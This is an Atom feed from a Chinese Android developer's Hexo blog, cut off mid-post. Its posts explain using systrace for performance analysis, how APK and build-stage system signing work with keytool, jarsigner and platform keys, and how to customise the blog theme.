<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风中老狼的博客</title>
  <subtitle>不积跬步，无以至千里；不积小流，无以成江海</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://maoao530.github.io/"/>
  <updated>2017-02-06T13:35:47.897Z</updated>
  <id>https://maoao530.github.io/</id>
  
  <author>
    <name>风中老狼</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>&lt;font color=&quot;red&quot;&gt;【置顶】&lt;/font&gt; Android学习计划</title>
    <link href="https://maoao530.github.io/2017/02/06/android-study/"/>
    <id>https://maoao530.github.io/2017/02/06/android-study/</id>
    <published>2017-02-06T13:31:21.000Z</published>
    <updated>2017-02-06T13:35:47.897Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>理解和使用systrace</title>
    <link href="https://maoao530.github.io/2017/02/06/systrace/"/>
    <id>https://maoao530.github.io/2017/02/06/systrace/</id>
    <published>2017-02-06T03:25:51.000Z</published>
    <updated>2017-02-06T13:25:40.030Z</updated>
    
    <content type="html"><![CDATA[<p>理解和使用systrace。</p>
<a id="more"></a>
<h1 id="一、介绍systrace"><a href="#一、介绍systrace" class="headerlink" title="一、介绍systrace"></a>一、介绍systrace</h1><p>systrace是Android4.1版本之后推出的，对系统Performance分析的工具。</p>
<p>systrace的功能包括跟踪系统的I/O操作、内核工作队列、CPU负载以及Android各个子系统的运行状况等。在Android平台中，它主要由3部分组成：</p>
<ul>
<li><strong>内核部分：</strong>Systrace利用了Linux Kernel中的<code>ftrace</code>功能。所以，如果要使用systrace的话，必须开启kernel中和ftrace相关的模块。</li>
<li><strong>数据采集部分</strong>：Android定义了一个Trace类。应用程序可利用该类把统计信息输出给ftrace。同时，Android还有一个<code>atrace</code>程序，它可以从ftrace中读取统计信息然后交给数据分析工具来处理。</li>
<li><strong>数据分析工具</strong>：Android提供一个<code>systrace.py</code>（python脚本文件，位于Android SDK目录<code>/sdk/platform-tools/systrace</code>中，其内部将调用atrace程序）用来配置数据采集的方式（如采集数据的标签、输出文件名等）和收集ftrace统计数据并生成一个结果网页文件供用户查看。</li>
</ul>
<h1 id="二、抓取systrace"><a href="#二、抓取systrace" class="headerlink" title="二、抓取systrace"></a>二、抓取systrace</h1><p>有三种方式抓取systrace：</p>
<h2 id="2-1-systrace-py工具"><a href="#2-1-systrace-py工具" class="headerlink" title="2.1 systrace.py工具"></a>2.1 systrace.py工具</h2><p>命令行的用法是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python systrace.py [options] [category1] [category2] ... [categoryN]</div></pre></td></tr></table></figure>
<p>需要装python，最好是2.7版本，避免出现问题，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd android-sdk/platform-tools/systrace</div><div class="line">python systrace.py --time=10 -o mynewtrace.html sched gfx view wm</div></pre></td></tr></table></figure>
<h3 id="2-1-1-options"><a href="#2-1-1-options" class="headerlink" title="2.1.1 options"></a>2.1.1 options</h3><p>其中options可取值：</p>
<table>
<thead>
<tr>
<th>options</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>-o  &lt; FILE &gt;</td>
<td style="text-align:left">输出的目标文件</td>
</tr>
<tr>
<td>-t N, –time=N</td>
<td style="text-align:left">执行时间，默认5s</td>
</tr>
<tr>
<td>-b N, –buf-size=N</td>
<td style="text-align:left">buffer大小（单位kB),用于限制trace总大小，默认无上限</td>
</tr>
<tr>
<td>-k &lt; KFUNCS &gt;，–ktrace=&lt; KFUNCS &gt;</td>
<td style="text-align:left">追踪kernel函数，用逗号分隔</td>
</tr>
<tr>
<td>-a &lt; APP_NAME &gt;,–app=&lt; APP_NAME &gt;</td>
<td style="text-align:left">追踪应用包名，用逗号分隔</td>
</tr>
<tr>
<td>–from-file=&lt; FROM_FILE &gt;</td>
<td style="text-align:left">从文件中创建互动的systrace</td>
</tr>
<tr>
<td>-e &lt; DEVICE_SERIAL &gt;,–serial=&lt; DEVICE_SERIAL &gt;</td>
<td style="text-align:left">指定设备</td>
</tr>
<tr>
<td>-l, –list-categories</td>
<td style="text-align:left">列举可用的tags</td>
</tr>
</tbody>
</table>
<h3 id="2-1-2-category"><a href="#2-1-2-category" class="headerlink" title="2.1.2 category"></a>2.1.2 category</h3><p>其中category可取值：</p>
<table>
<thead>
<tr>
<th>category</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>gfx</td>
<td style="text-align:left">Graphics</td>
</tr>
<tr>
<td>input</td>
<td style="text-align:left">Input</td>
</tr>
<tr>
<td>view</td>
<td style="text-align:left">View System</td>
</tr>
<tr>
<td>webview</td>
<td style="text-align:left">WebView</td>
</tr>
<tr>
<td>wm</td>
<td style="text-align:left">Window Manager</td>
</tr>
<tr>
<td>am</td>
<td style="text-align:left">Activity Manager</td>
</tr>
<tr>
<td>sm</td>
<td style="text-align:left">Sync Manager</td>
</tr>
<tr>
<td>audio</td>
<td style="text-align:left">Audio</td>
</tr>
<tr>
<td>video</td>
<td style="text-align:left">Video</td>
</tr>
<tr>
<td>camera</td>
<td style="text-align:left">Camera</td>
</tr>
<tr>
<td>hal</td>
<td style="text-align:left">Hardware Modules</td>
</tr>
<tr>
<td>app</td>
<td style="text-align:left">Application</td>
</tr>
<tr>
<td>res</td>
<td style="text-align:left">Resource Loading</td>
</tr>
<tr>
<td>dalvik</td>
<td style="text-align:left">Dalvik VM</td>
</tr>
<tr>
<td>rs</td>
<td style="text-align:left">RenderScript</td>
</tr>
<tr>
<td>bionic</td>
<td style="text-align:left">Bionic C Library</td>
</tr>
<tr>
<td>power</td>
<td style="text-align:left">Power Management</td>
</tr>
<tr>
<td>sched</td>
<td style="text-align:left">CPU Scheduling</td>
</tr>
<tr>
<td>irq IRQ</td>
<td style="text-align:left">Events</td>
</tr>
<tr>
<td>freq</td>
<td style="text-align:left">CPU Frequency</td>
</tr>
<tr>
<td>idle</td>
<td style="text-align:left">CPU Idle</td>
</tr>
<tr>
<td>disk</td>
<td style="text-align:left">Disk I/O</td>
</tr>
<tr>
<td>mmc</td>
<td style="text-align:left">eMMC commands</td>
</tr>
<tr>
<td>load</td>
<td style="text-align:left">CPU Load</td>
</tr>
<tr>
<td>sync</td>
<td style="text-align:left">Synchronization</td>
</tr>
<tr>
<td>workq</td>
<td style="text-align:left">Kernel Workqueues</td>
</tr>
<tr>
<td>memreclaim</td>
<td style="text-align:left">Kernel Memory Reclaim</td>
</tr>
<tr>
<td>regulators</td>
<td style="text-align:left">Voltage and Current Regulators</td>
</tr>
</tbody>
</table>
<h2 id="2-2-Device-Monitor（DDMS）"><a href="#2-2-Device-Monitor（DDMS）" class="headerlink" title="2.2 Device Monitor（DDMS）"></a>2.2 Device Monitor（DDMS）</h2><p>可以使用Eclipse或者Android Studio集成开发工具，切换到DDMS，点击devices，点击Systrace按钮：</p>
<center><br><img src="/img/archives/ddms-capture-systrace.png" alt="ddms-capture-systrace.png"><br></center>

<p>补充说明：</p>
<ul>
<li>Destionation file ：trace输出的文件路径</li>
<li>Trace duration : 配置抓取systrace的时间，通常设置5秒，并在5秒内重现问题，时间太短会导致问题重现时没有被抓到，时间太长会导致Java Heap不够而无法保存，因此在能抓到问题点的情况下，时间越小越好。</li>
<li>Trace Buffer Size : Buffer Size是存储systrace的size，同样的，太小会导致信息丢失，时间太长会导致Java Heap不够而无法保存，建议20480。</li>
<li>Enable Application Traces from :如果用户有自己在应用程序中加入自己的systrace log:<br><code>Trace.beginSection(&quot;newInstance&quot;);
Trace.endSection();</code><br>那么此处必须选择这个应用对应的进程名字，否则新加的systrace log不会被抓到。</li>
</ul>
<h1 id="三、自定义systrace"><a href="#三、自定义systrace" class="headerlink" title="三、自定义systrace"></a>三、自定义systrace</h1><p>有时候为了debug方便，那么我们需要自己在apk或者framework层添加trace信息：</p>
<h2 id="3-1-app层"><a href="#3-1-app层" class="headerlink" title="3.1 app层"></a>3.1 app层</h2><p>app可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import android.os.Trace;</div><div class="line">Trace.beginSection(String sectionName)</div><div class="line">Trace.EndSection()</div></pre></td></tr></table></figure>
<p>然后通过<code>python systrace.py --app=sectionName</code> 指定apk，或者通过ddms选择指定apk，抓取systrace分析。</p>
<h2 id="3-2-Java-framework层"><a href="#3-2-Java-framework层" class="headerlink" title="3.2 Java framework层"></a>3.2 Java framework层</h2><p>Java Framework可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import android.os.Trace;</div><div class="line">Trace.traceBegin(long traceTag, String methodName)</div><div class="line">Trace.traceEnd(long traceTag)</div></pre></td></tr></table></figure>
<p>抓取systrace分析。</p>
<h2 id="3-3-Native-framework层"><a href="#3-3-Native-framework层" class="headerlink" title="3.3 Native framework层"></a>3.3 Native framework层</h2><p>Native Framework可以使用：最好在函数开头声明定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#include &lt;cutils/trace.h&gt;</div><div class="line">ATRACE_CALL()</div></pre></td></tr></table></figure>
<p>抓取systrace分析。</p>
<h1 id="四、分析systrace"><a href="#四、分析systrace" class="headerlink" title="四、分析systrace"></a>四、分析systrace</h1><p>Google Chrome浏览器可以打开systrace，如果打不开，可以通过<code>chrome://tracing/</code>，然后load systrace。</p>
<p>以分析UI Performance为例：</p>
<h2 id="4-1-Frame"><a href="#4-1-Frame" class="headerlink" title="4.1 Frame"></a>4.1 Frame</h2><p>每个应用都有一行专门显示frame，每一帧就显示为圆圈，正常绘制是1秒60帧，大约一帧16.6毫秒，在这个值以下是正常颜色绿色，如果超过它就会变成红色、黄色。非绿色的都说明有问题。这时需要通过’w’键放大那一帧，然后按‘m’键高亮，进一步分析问题。</p>
<p>对于Android 5.0(API level 21)或者更高的设备，该问题主要聚焦在<code>UI Thread</code>和<code>Render Thread</code>这两个线程当中。对于更早的版本，则所有工作在<code>UI Thread</code>。</p>
<p><img src="/img/archives/systrace-fenxi.png" alt="systrace-fenxi.png"></p>
<h2 id="4-2-Alerts"><a href="#4-2-Alerts" class="headerlink" title="4.2 Alerts"></a>4.2 Alerts</h2><p>Systrace能自动分析trace中的事件，并能自动高亮性能问题作为一个Alerts，建议调试人员下一步该怎么做。</p>
<p>比如对于丢帧是，点击黄色或红色的Frames圆点便会有相关的提示信息；另外，在systrace的最右上方，有一个Alerts tab可以展开，这里记录着所有的的警告提示信息。</p>
<h1 id="五、快捷操作"><a href="#五、快捷操作" class="headerlink" title="五、快捷操作"></a>五、快捷操作</h1><h2 id="5-1-导航操作"><a href="#5-1-导航操作" class="headerlink" title="5.1 导航操作"></a>5.1 导航操作</h2><table>
<thead>
<tr>
<th>导航操作</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>w</td>
<td>放大，[+shift]速度更快</td>
</tr>
<tr>
<td>s</td>
<td>缩小，[+shift]速度更快</td>
</tr>
<tr>
<td>a</td>
<td>左移，[+shift]速度更快</td>
</tr>
<tr>
<td>d</td>
<td>右移，[+shift]速度更快</td>
</tr>
</tbody>
</table>
<h2 id="5-2-快捷操作"><a href="#5-2-快捷操作" class="headerlink" title="5.2 快捷操作"></a>5.2 快捷操作</h2><table>
<thead>
<tr>
<th>常用操作</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>f</td>
<td>放大当前选定区域</td>
</tr>
<tr>
<td>m</td>
<td>标记当前选定区域</td>
</tr>
<tr>
<td>v</td>
<td>高亮VSync</td>
</tr>
<tr>
<td>g</td>
<td>切换是否显示60hz的网格线</td>
</tr>
<tr>
<td>0</td>
<td>恢复trace到初始态，这里是数字0而非字母o</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>一般操作</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>h</td>
<td>切换是否显示详情</td>
</tr>
<tr>
<td>/</td>
<td>搜索关键字</td>
</tr>
<tr>
<td>enter</td>
<td>显示搜索结果，可通过← →定位搜索结果</td>
</tr>
<tr>
<td>`</td>
<td>显示/隐藏脚本控制台</td>
</tr>
<tr>
<td>?</td>
<td>显示帮助功能</td>
</tr>
</tbody>
</table>
<p>对于脚本控制台，除了能当做记事本的功能，目前还不清楚有啥功能，或许还在开发中。</p>
<h2 id="5-3-模式切换"><a href="#5-3-模式切换" class="headerlink" title="5.3 模式切换"></a>5.3 模式切换</h2><ul>
<li>Select mode: 双击已选定区能将所有相同的块高亮选中；（对应数字1）</li>
<li>Pan mode: 拖动平移视图（对应数字2）</li>
<li>Zoom mode:通过上/下拖动鼠标来实现放大/缩小功能；（对应数字3）</li>
<li>Timing mode:拖动来创建或移除时间窗口线。（对应数字4）</li>
</ul>
<p>可通过按数字1~4，用于切换鼠标模式； 另外，按住alt键，再滚动鼠标滚轮能实现放大/缩小功能。</p>
<p><strong>Reference:</strong></p>
<ul>
<li><a href="https://developer.android.com/studio/profile/systrace-commandline.html" target="_blank" rel="external">https://developer.android.com/studio/profile/systrace-commandline.html</a></li>
<li><a href="https://developer.android.com/studio/profile/systrace.html" target="_blank" rel="external">https://developer.android.com/studio/profile/systrace.html</a></li>
<li><a href="http://gityuan.com/2016/01/17/systrace/" target="_blank" rel="external">http://gityuan.com/2016/01/17/systrace/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;理解和使用systrace。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="systrace" scheme="https://maoao530.github.io/tags/systrace/"/>
    
  </entry>
  
  <entry>
    <title>APK签名机制</title>
    <link href="https://maoao530.github.io/2017/01/31/apk-sign/"/>
    <id>https://maoao530.github.io/2017/01/31/apk-sign/</id>
    <published>2017-01-31T10:50:34.000Z</published>
    <updated>2017-01-31T11:36:17.384Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍apk的签名机制。</p>
<a id="more"></a>
<h1 id="一、APK签名"><a href="#一、APK签名" class="headerlink" title="一、APK签名"></a>一、APK签名</h1><p>apk发布者需要使用android 密钥生成工具创建的keystore对apk进行签名。</p>
<h1 id="二、APK升级"><a href="#二、APK升级" class="headerlink" title="二、APK升级"></a>二、APK升级</h1><p>用于升级的新版本的apk必须使用原有的keystore进行签名，这样才能保证顺利升级。</p>
<h1 id="三、android签名文件"><a href="#三、android签名文件" class="headerlink" title="三、android签名文件"></a>三、android签名文件</h1><p>采用RSA密钥机制对APK进行签名。<br>对比已签名和未签名的apk包，签名的apk包多了一个名为META-INF的文件夹，里面有三个文件：MANIFEST.MF、CERT.SF和CERT.RSA。这三个文件就是签名相关的文件。</p>
<h2 id="3-1-MANIFEST-MF"><a href="#3-1-MANIFEST-MF" class="headerlink" title="3.1 MANIFEST.MF"></a>3.1 MANIFEST.MF</h2><p>遍历apk包中所有文件，对非文件夹、非签名文件的文件，逐个生成SHA1数字签名信息，再用Base64进行编码。之后生成的签名写入MANIFEST.MF文件。</p>
<h2 id="3-2-CERT-SF"><a href="#3-2-CERT-SF" class="headerlink" title="3.2 CERT.SF"></a>3.2 CERT.SF</h2><p>对生成的MANIFEST.MF签名信息，使用SHA1-RSA算法，用私钥进行签名。</p>
<h2 id="3-3-CERT-RSA"><a href="#3-3-CERT-RSA" class="headerlink" title="3.3 CERT.RSA"></a>3.3 CERT.RSA</h2><p>在CERT.RSA文件中保存公钥、所采用的加密算法等信息。</p>
<h1 id="四、Android签名验证"><a href="#四、Android签名验证" class="headerlink" title="四、Android签名验证"></a>四、Android签名验证</h1><p>android原本的签名验证是怎么样的呢？在安装过程中，系统会读取apk包中的MANIFEST.MF、CERT.SF和CERT.RSA：</p>
<ol>
<li>用MANIFEST.MF验证apk包的完整性。</li>
<li>用CERT.SF验证MANIFEST.MF的完整性。</li>
<li>用CERT.RSA验证CERT.SF的签名。</li>
</ol>
<h1 id="五、总结APK的签名流程"><a href="#五、总结APK的签名流程" class="headerlink" title="五、总结APK的签名流程"></a>五、总结APK的签名流程</h1><p>Apk包加密的公钥就打包在apk包内，且不同的私钥对应不同的公钥。公钥一致，则私钥一致。可以通过公钥的对比来判断私钥是否一致。(公钥与私钥是一一对应的关系，这种对应关系是怎么形成的？？谁分配私钥公钥。Answer：是由加密算法生成的)</p>
<h1 id="六、tool-instruction"><a href="#六、tool-instruction" class="headerlink" title="六、tool instruction"></a>六、tool instruction</h1><ul>
<li>Keytool是一个java数据证书的管理工具。</li>
<li>jarsigner  是apk签名工具。</li>
</ul>
<p>jdk包提供以上工具，需自行安装jdk包。</p>
<h1 id="七、keystore生成"><a href="#七、keystore生成" class="headerlink" title="七、keystore生成"></a>七、keystore生成</h1><p>keystore就是用来保存密钥对的，比如公钥和私钥。用jdk的keytool工具生成keystore：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keytool -genkey -alias test.keystore -keyalg RSA -validity 20000 -keystore test.keystore</div></pre></td></tr></table></figure>
<p><img src="/img/archives/keystore-generate.png" alt="keystore-generate.png"></p>
<p>Note：</p>
<ul>
<li>alias test.keystore 生成别名为test.keystore的keystore</li>
<li>keyalg RSA 加密和数字签名的算法</li>
<li>validity 20000 有效天数</li>
</ul>
<p><font color="red">输入keystore password后经过加密算法和加密工具生成私钥和公钥，要保护好password，因为只能用password打开keystore，然后访问key。</font></p>
<p>用私钥证书签名，用公钥证书验证。输入密码和developer信息后，使用一些算法生成相应的数字证书，其他人可以用这个数字证书来验证这个apk是不是该developer开发的。</p>
<h1 id="八、证书的生成"><a href="#八、证书的生成" class="headerlink" title="八、证书的生成"></a>八、证书的生成</h1><p>通过.keystore文件生成*.cer证书文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Keytool -export -keystore test.keystore -alias test.keystore -file test.cer</div></pre></td></tr></table></figure>
<p><img src="/img/archives/keystore-export.png" alt="keystore-export.png"></p>
<p>Note：<br>将把证书库 test.keystore 中的别名为 test.keystore的证书导出到 test.cer 。证书文件中，它包含证书主体的信息及证书的公钥，不包括私钥，可以公开。 </p>
<h1 id="九、使用Keystore-签名apk"><a href="#九、使用Keystore-签名apk" class="headerlink" title="九、使用Keystore 签名apk"></a>九、使用Keystore 签名apk</h1><p>使用jarsigner工具对apk进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jarsigner -verbose -keystore test.keystore  -signedjar HelloWorld_sign.apk Hello_un_sign.apk test.keystore</div></pre></td></tr></table></figure>
<p><img src="/img/archives/apk-sign.png" alt="apk-sign.png"></p>
<p>Note：</p>
<ul>
<li>keystore  test.keystore指定密钥库的位置</li>
<li>signedjar  HelloWorld_signed.apk HelloWorld_unsign.apk test.keystore  依次是签名后的文件HelloWorld_signed.apk，要签名的文件HelloWorld_unsign.apk和密钥库test.keystore  </li>
</ul>
<h1 id="十、相关问题"><a href="#十、相关问题" class="headerlink" title="十、相关问题"></a>十、相关问题</h1><h2 id="10-1-证书有效期"><a href="#10-1-证书有效期" class="headerlink" title="10.1 证书有效期"></a>10.1 证书有效期</h2><p>只在程序安装时才检查证书的有效期：</p>
<ul>
<li>证书的有效期包含程序的生命周期，只在程序安装时才检查证书的有效期.</li>
<li>一旦证书失效，程序将不能正常升级，但已安装的程序可以继续使用；</li>
<li>Android Market强制要求所有应用程序证书的有效期要持续到2033年10月22日以后。</li>
</ul>
<p>已过期的key是无法再对apk进行签名的.</p>
<h2 id="10-2-对已签名Apk的再签名"><a href="#10-2-对已签名Apk的再签名" class="headerlink" title="10.2 对已签名Apk的再签名"></a>10.2 对已签名Apk的再签名</h2><ul>
<li>追加签名.</li>
<li>升级时,需要验证所有签名一致.</li>
</ul>
<h2 id="10-3-平台里的证书"><a href="#10-3-平台里的证书" class="headerlink" title="10.3 平台里的证书"></a>10.3 平台里的证书</h2><ul>
<li>平台并没有特别存放证书.</li>
<li>当系统扫描系统apk,发现是system uid 时,就会将其签名再存放到 system uid对应的签名中.(一对一)</li>
<li>当用户在此安装apk使用system uid 时, 就会通过system uid 索引找到签名进行对比.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍apk的签名机制。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="签名" scheme="https://maoao530.github.io/tags/%E7%AD%BE%E5%90%8D/"/>
    
      <category term="apk" scheme="https://maoao530.github.io/tags/apk/"/>
    
  </entry>
  
  <entry>
    <title>Android系统build阶段签名机制</title>
    <link href="https://maoao530.github.io/2017/01/31/android-build-sign/"/>
    <id>https://maoao530.github.io/2017/01/31/android-build-sign/</id>
    <published>2017-01-31T07:48:29.000Z</published>
    <updated>2017-01-31T09:06:49.959Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍Android系统build阶段的签名机制。</p>
<a id="more"></a>
<h1 id="一、系统build阶段签名机制"><a href="#一、系统build阶段签名机制" class="headerlink" title="一、系统build阶段签名机制"></a>一、系统build阶段签名机制</h1><p>1、系统中有4组key用于build阶段对apk进行签名：</p>
<ul>
<li>Media</li>
<li>Platform</li>
<li>Shared</li>
<li>Testkey</li>
</ul>
<p>default key是放在Android源码的/build/target/product/security目录下:</p>
<ul>
<li>media.pk8与media.x509.pem；</li>
<li>platform.pk8与platform.x509.pem；</li>
<li>shared.pk8与shared.x509.pem；</li>
<li>testkey.pk8与testkey.x509.pem；</li>
</ul>
<p>其中，<code>*.pk8</code>文件为私钥，<code>*.x509.pem</code>文件为公钥，这需要去了解非对称加密方式。</p>
<p>2、在apk的android.mk文件中会指定LOCAL_CERTIFICATE 变量：</p>
<p>LOCAL_CERTIFICATE可设置的值如下：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LOCAL_CERTIFICATE := testkey   # 普通APK，默认情况下使用</div><div class="line">LOCAL_CERTIFICATE := platform  # 该APK完成一些系统的核心功能,这种方式编译出来的APK所在进程的UID为system</div><div class="line">LOCAL_CERTIFICATE := shared    # 该APK是media/download系统中的一环</div><div class="line">LOCAL_CERTIFICATE := media     # 该APK是media/download系统中的一环</div></pre></td></tr></table></figure>
<p>如果不指定，默认使用testkey。</p>
<p>对应的，除了在Android.mk指定上述的值，还需要在APK源码的AndroidManifest.xml文件的manifest节点里面申明权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">android:sharedUserId=&quot;android.uid.system&quot;</div><div class="line">android:sharedUserId=&quot;android.uid.shared&quot;</div><div class="line">android:sharedUserId=&quot;android.media&quot;</div></pre></td></tr></table></figure>
<p>3、Build规则是Build/core/prebuilt.mk。<br>4、在build/core/config.mk中，<code>DEFAULT_SYSTEM_DEV_CERTIFICATE</code>可以通过<code>PRODUCT_DEFAULT_DEV_CERTIFICATE</code>去指定各家厂商的key path。</p>
<p>我们可以看到，默认为build/target/product/security/testkey。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># The default key if not set as LOCAL_CERTIFICATE</div><div class="line">ifdef PRODUCT_DEFAULT_DEV_CERTIFICATE</div><div class="line">  DEFAULT_SYSTEM_DEV_CERTIFICATE := $(PRODUCT_DEFAULT_DEV_CERTIFICATE)</div><div class="line">else</div><div class="line">  DEFAULT_SYSTEM_DEV_CERTIFICATE := build/target/product/security/testkey</div><div class="line">endif</div></pre></td></tr></table></figure></p>
<h1 id="二、自定义系统签名的key"><a href="#二、自定义系统签名的key" class="headerlink" title="二、自定义系统签名的key"></a>二、自定义系统签名的key</h1><p>上面介绍了系统有默认四组key，那么如果我们要制作自己的key，需要怎么做呢？<br>在build/target/product/security/目录下有一个README，里面有说明怎么制作这些key并且使用。</p>
<p>1、进入Development/tools/ 目录 </p>
<p><img src="/img/archives/cd-dev-tool.png" alt="cd-dev-tool.png"></p>
<p>2、使用make_key工具生成签名文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sh make_key releasekey  &apos;/C=CN/ST=Guangdong/L=Shenzhen/O=Mediatek/OU=MTK/CN=fzll/emailAddress=maoao530@foxmail.com&apos;</div></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li>C  : Country Name (2 letter code)</li>
<li>ST : State or Province Name (full name)</li>
<li>L  : Locality Name (eg, city)</li>
<li>O  : Organization Name (eg, company)</li>
<li>OU : Organizational Unit Name (eg, section)</li>
<li>CN : Common Name (eg, your name or your server’s hostname)</li>
<li>emailAddress : Contact email address</li>
</ul>
<p>3、用ls命令发现目录下多了两个文件：releasekey.x509.pem 和 releasekey.pk8</p>
<p><img src="/img/archives/release-key.png" alt="release-key.png"></p>
<p>4、同样的步骤生成platform / shared /  media </p>
<p>5、用自定义的key替换build/target/product/security/目录下面的key。</p>
<h1 id="三、对APK进行系统签名"><a href="#三、对APK进行系统签名" class="headerlink" title="三、对APK进行系统签名"></a>三、对APK进行系统签名</h1><p>为了使apk有system权限，通常我们需要对其进行系统签名：</p>
<p>1、在应用程序的AndroidManifest.xml中的manifest节点中加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">android:sharedUserId=&quot;android.uid.system&quot;这个属性。</div></pre></td></tr></table></figure>
<p>2、修改它的Android.mk文件，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LOCAL_CERTIFICATE := platform</div></pre></td></tr></table></figure>
<p>重新编译，生成的apk就有修改system权限了,我们通过<code>ps</code>命令查看APK所在进程的UID，发现值为system。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍Android系统build阶段的签名机制。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="签名" scheme="https://maoao530.github.io/tags/%E7%AD%BE%E5%90%8D/"/>
    
      <category term="android" scheme="https://maoao530.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Next博客优化</title>
    <link href="https://maoao530.github.io/2017/01/25/hexo-blog-seo/"/>
    <id>https://maoao530.github.io/2017/01/25/hexo-blog-seo/</id>
    <published>2017-01-25T13:30:58.000Z</published>
    <updated>2017-01-31T05:56:57.181Z</updated>
    
    <content type="html"><![CDATA[<p>进一步打造自己的Blog。</p>
<a id="more"></a>
<h1 id="一、搜索服务"><a href="#一、搜索服务" class="headerlink" title="一、搜索服务"></a>一、搜索服务</h1><p>安装 <code>hexo-generator-searchdb</code></p>
<p>在站点的根目录下执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-searchdb --save</div></pre></td></tr></table></figure>
<p>编辑主题配置文件_config.yml，新增以下内容到任意位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">search:</div><div class="line">  path: search.xml</div><div class="line">  field: post</div><div class="line">  format: html</div><div class="line">  limit: 10000</div></pre></td></tr></table></figure>
<h1 id="二、开启打赏功能"><a href="#二、开启打赏功能" class="headerlink" title="二、开启打赏功能"></a>二、开启打赏功能</h1><p>主题的_config.yml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！</div><div class="line">wechatpay: /img/archives/ss.png</div><div class="line">alipay: /img/archives/ss.png</div></pre></td></tr></table></figure>
<h1 id="三、字体"><a href="#三、字体" class="headerlink" title="三、字体"></a>三、字体</h1><p><strong>全局字体：</strong>编辑 next/source/css/_variables/custom.styl,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$font-size-base = 16px;</div></pre></td></tr></table></figure>
<h1 id="四、背景图片"><a href="#四、背景图片" class="headerlink" title="四、背景图片"></a>四、背景图片</h1><p>next/source/css/_custom/custom.styl文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">body &#123; background:url(/images/backGround.jpg);&#125;</div></pre></td></tr></table></figure>
<h1 id="五、背景颜色"><a href="#五、背景颜色" class="headerlink" title="五、背景颜色"></a>五、背景颜色</h1><p>定义颜色变量：themes/next/source/css/_variables/custom.styl</p>
